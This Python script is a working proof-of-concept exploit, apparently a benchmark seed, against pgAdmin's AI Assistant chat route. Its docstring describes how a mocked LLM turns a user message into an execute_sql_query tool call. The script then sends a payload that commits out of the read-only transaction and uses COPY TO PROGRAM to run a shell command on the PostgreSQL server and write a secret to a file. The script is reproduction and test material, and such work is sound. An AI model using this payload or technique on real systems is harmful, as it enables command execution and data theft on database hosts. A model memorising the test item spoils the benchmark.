#!/usr/bin/env python3
"""[GIVEN] CVE-2026-12045 seed exploit for pgadmin-cve-2026-17351.

Drive the REAL AI Assistant NLQ chat route with a mock OpenAI endpoint.
The user message is echoed back by the (mock) LLM as an execute_sql_query
tool call, and pgAdmin's tool dispatcher runs execute_readonly_query with
that exact text inside BEGIN TRANSACTION READ ONLY.

On 9.15 (V0) there is NO validation: the payload
`COMMIT;COPY (SELECT secret FROM pcb_secret) TO PROGRAM 'cat > /tmp/pcb_result.txt';SELECT 1 --`
ends the read-only transaction and runs the COPY in autocommit, writing
the planted flag to /tmp/pcb_result.txt in the PostgreSQL container.
On 9.16 (V1) _validate_readonly_query rejects multi-statement input before
any connection work happens.
"""
import json
import os
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
import pgadm_util as u  # noqa: E402

PAYLOAD = (
    "COMMIT;COPY (SELECT secret FROM pcb_secret) TO PROGRAM "
    "'cat > /tmp/pcb_result.txt';SELECT 1 --"
)


def candidate(*, version="v0", flag="pcbflag"):
    if not u.wait_ready(version):
        return {"ok": False, "status": 0, "body": "env not ready"}
    s = u.login(version)
    sid = u.ensure_server(version, s)
    did = u.get_did(version, s, sid)
    u.init_query_tool(version, s, sid, did)
    time.sleep(1)
    r = s.post(
        u.BASE[version] + "/sqleditor/nlq/chat/424242/stream",
        json={"message": PAYLOAD, "conversation_id": None, "history": []},
        timeout=120, stream=True,
    )
    r.close()
    time.sleep(2)
    out = u.read_flag_file(version)
    return {"ok": flag in out, "status": r.status_code, "body": out[:200]}


if __name__ == "__main__":
    v = sys.argv[1] if len(sys.argv) > 1 else os.environ.get("VERSION", "v0")
    try:
        print(json.dumps(candidate(version=v, flag="pcbflag")))
    except Exception as e:
        print(json.dumps({"ok": False, "status": 0, "body": f"env error: {e}"}))
        sys.exit(2)
